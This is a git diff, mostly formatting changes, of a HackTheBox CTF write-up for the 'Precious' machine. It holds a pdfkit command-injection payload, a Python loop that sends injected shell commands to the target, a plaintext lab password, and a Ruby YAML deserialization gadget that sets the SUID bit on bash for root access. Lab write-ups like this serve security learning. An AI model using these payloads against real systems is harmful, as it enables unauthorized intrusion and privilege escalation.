@@ -1,26 +1,27 @@
-1. [Writeup: **Precious**](#writeup-precious) 1. [EASY machine (hackthebox.com)](#easy-machine-hacktheboxcom) 2. [by **Sylvain _"JavaliMZ"_ Júlio** - 30/12/2022](#by-sylvain-javalimz-júlio---30122022)
-2. [Introduction](#introduction)
-3. [Enumeration](#enumeration)
-4. [Exploit - Remote Code Execution](#exploit---remote-code-execution)
-5. [Foothold](#foothold)
-6. [Privilege Escalation](#privilege-escalation)
-7. [Conclusion](#conclusion)
-
 ![](Assets/HTB-Linux-Easy-Precious/Precious.png)
 
 <img src="https://img.shields.io/badge/Precious-HackTheBox-green?style=plastic" width="200">
 
-# Writeup: **Precious**
+<h1> Writeup: <b>Precious</b></h1>
 
-#### EASY machine (hackthebox.com)
+<h4> EASY machine (hackthebox.com)</h4>
 
-#### by **Sylvain _"JavaliMZ"_ Júlio** - 30/12/2022
-
----
+<h4> by <b>Sylvain <i>"JavaliMZ"</i> Júlio</b> - 30/12/2022</h4>
 
 ---
 
-# Introduction
+---
+
+- [1. Introduction](#1-introduction)
+- [2. Enumeration](#2-enumeration)
+- [3. Exploit - Remote Code Execution](#3-exploit---remote-code-execution)
+- [4. Foothold](#4-foothold)
+- [5. Privilege Escalation](#5-privilege-escalation)
+- [6. Conclusion](#6-conclusion)
+
+---
+
+# 1. Introduction
 
 This write-up was created for two purposes. Normally, my write-ups are in Portuguese, but this time, I am writing in English because I am in a Cyber Security degree, and I need to complete an assignment for my English class during the 2022 winter break. The assignment was to summarize and explain three good articles about a topic I like, but I didn't know what to choose, so I decided to make the "Precious" machine from HTB and read some articles about the machine's vulnerabilities. Additionally, my teacher Maria's goal is to keep us interested and active in English, so I think I am respecting the overall rules =).
 
@@ -28,7 +29,7 @@ For this time, I will not be discussing possible ways to find something or expla
 
 I will try to make analogies to the real world so that my teacher does not get lost. I will do my best.
 
-# Enumeration
+# 2. Enumeration
 
 Like every machine, we need to know how to access it. HTB gives us the IP address, but we don't know anything else. The IP address is like the address of a house, but we need to figure out which doors are open to get in. In a machine, these doors are called "ports" (in reference to the ports of ships that allow the arrival of goods from the outside world). There are always 65,535 ports in all machines. It's a lot!! But we don't need to knock on all the ports manually... For that, we have a tool called **nmap**.
 
@@ -36,12 +37,12 @@ First, we need to confirm that we can reach the IP:
 
 ```bash
 ping -c 1 10.10.11.189
-	# PING 10.10.11.189 (10.10.11.189) 56(84) bytes of data.
-	# 64 bytes from 10.10.11.189: icmp_seq=1 ttl=63 time=72.5 ms
+    # PING 10.10.11.189 (10.10.11.189) 56(84) bytes of data.
+    # 64 bytes from 10.10.11.189: icmp_seq=1 ttl=63 time=72.5 ms
 
-	# --- 10.10.11.189 ping statistics ---
-	# 1 packets transmitted, 1 received, 0% packet loss, time 0ms
-	# rtt min/avg/max/mdev = 72.530/72.530/72.530/0.000 ms
+    # --- 10.10.11.189 ping statistics ---
+    # 1 packets transmitted, 1 received, 0% packet loss, time 0ms
+    # rtt min/avg/max/mdev = 72.530/72.530/72.530/0.000 ms
 ```
 
 We send an ICMP packet, and the target machine sends it back. With the **ping** command (like ping pong), we know the machine is alive and we can start scanning the ports. We noticed one more thing with the ping command. The result gives us the TTL (Time to Live) which refers to the number of hops that a packet is allowed to make before it is discarded. When a packet travels through the Internet, every time it passes through a router, the router decrements this value by 1. For Windows, TTL starts at 128, and for Linux, TTL starts at 64. We can use this information to approximate the Operating System of the target machine. In this case, it is likely a Linux machine. It is important for future commands on the target machine.
@@ -78,7 +79,7 @@ We can see that the website download a PDF file. Visually, it is just a simples 
 
 ![pdf Metadata](Assets/HTB-Linux-Easy-Precious/Exiftool.png)
 
-# Exploit - Remote Code Execution
+# 3. Exploit - Remote Code Execution
 
 We can see that the PDF Creator is a tool called **pdfkit v0.8.6**. This version is vulnerable and we can get a RCE (Remote Code Execution). We can see more about this vulnerability [here](https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795). To exploit this vulnerability, it's simple! We just need to add to the URL a parameter called **?user** and give a "space" but encoded (a space like %20 is the URL code for a space of the space bar). Next, we need to concatenate a bash code (because it is a Linux Machine) with the special symbol **`** (a code between 2 of this symbol in bash get execute before the rest of the command outside the symbols) around the code for execute it like if we are in a command line shell. The command we will try is a single ping to our machine to test if we really got remote code execution. The final URL will be:
 
@@ -95,11 +96,11 @@ We got a ping back! I also create a tiny script in Python to have a fast way to 
 import requests
 
 while True:
-	cmd = input("[fAkeSh3ll ~] > ")
-	data = {
-		'url': f"http://10.10.14.144/?name=%20`{cmd}`",
-		}
-	response = requests.post('**http://precious.htb/**', data=data, verify=False)
+    cmd = input("[fAkeSh3ll ~] > ")
+    data = {
+        'url': f"http://10.10.14.144/?name=%20`{cmd}`",
+        }
+    response = requests.post('**http://precious.htb/**', data=data, verify=False)
 ```
 
 Now, we can try to get a reverse shell. A reverse shell is a type of connection to get a shell on the target machine. But the way we got this is tricky. We need to find a way for the target machine to send its own shell to our machine. It's like trying to enter a house, and we need to find a way for the house to open its own door to give us access... The command that worked on the machine was this:
@@ -118,7 +119,7 @@ The query needs to be that exact and we need to adapt the IP and the port. We al
 
 ![Reverse Shell](Assets/HTB-Linux-Easy-Precious/ReverseShell.png)
 
-# Foothold
+# 4. Foothold
 
 We are in the machine. But we have low privilege. We need more!! HUAAHAHA!!
 
@@ -133,7 +134,7 @@ su henry
 # Q3c1AqGHtoI0aXAYFH
 ```
 
-# Privilege Escalation
+# 5. Privilege Escalation
 
 We got a little more privileges. But it is not enough!! WE NEED MORE AGAIN!!!!
 
@@ -148,23 +149,23 @@ We just create a file caller **test.txt** for confirm that the code is working. 
 ```bash
 ---
 - !ruby/object:Gem::Installer
-	i: x
+    i: x
 - !ruby/object:Gem::SpecFetcher
-	i: y
+    i: y
 - !ruby/object:Gem::Requirement
   requirements:
-	!ruby/object:Gem::Package::TarReader
-	io: &1 !ruby/object:Net::BufferedIO
-	  io: &1 !ruby/object:Gem::Package::TarReader::Entry
-		 read: 0
-		 header: "abc"
-	  debug_output: &1 !ruby/object:Net::WriteAdapter
-		 socket: &1 !ruby/object:Gem::RequestSet
-			 sets: !ruby/object:Net::WriteAdapter
-				 socket: !ruby/module 'Kernel'
-				 method_id: :system
-			 git_set: chmod +s /usr/bin/bash
-		 method_id: :resolve
+    !ruby/object:Gem::Package::TarReader
+    io: &1 !ruby/object:Net::BufferedIO
+      io: &1 !ruby/object:Gem::Package::TarReader::Entry
+         read: 0
+         header: "abc"
+      debug_output: &1 !ruby/object:Net::WriteAdapter
+         socket: &1 !ruby/object:Gem::RequestSet
+             sets: !ruby/object:Net::WriteAdapter
+                 socket: !ruby/module 'Kernel'
+                 method_id: :system
+             git_set: chmod +s /usr/bin/bash
+         method_id: :resolve
 ```
 
 Now, we just need to execute the sudo command, and the **bash** program will be altered. And we can execute bash as root with a special flag:
@@ -176,6 +177,6 @@ bash -p
 
 ![Root shell](Assets/HTB-Linux-Easy-Precious/RootAndFlags.png)
 
-# Conclusion
+# 6. Conclusion
 
 This machine was easy to get in, and the privilege escalation was a little more complex. But it was a good machine to learn more about Ruby and YAML. I hope you enjoyed this writeup. Fun fact: the machine is called Precious because it is a reference to the ruby programming language. Both vulnerabilities are related to the ruby language.
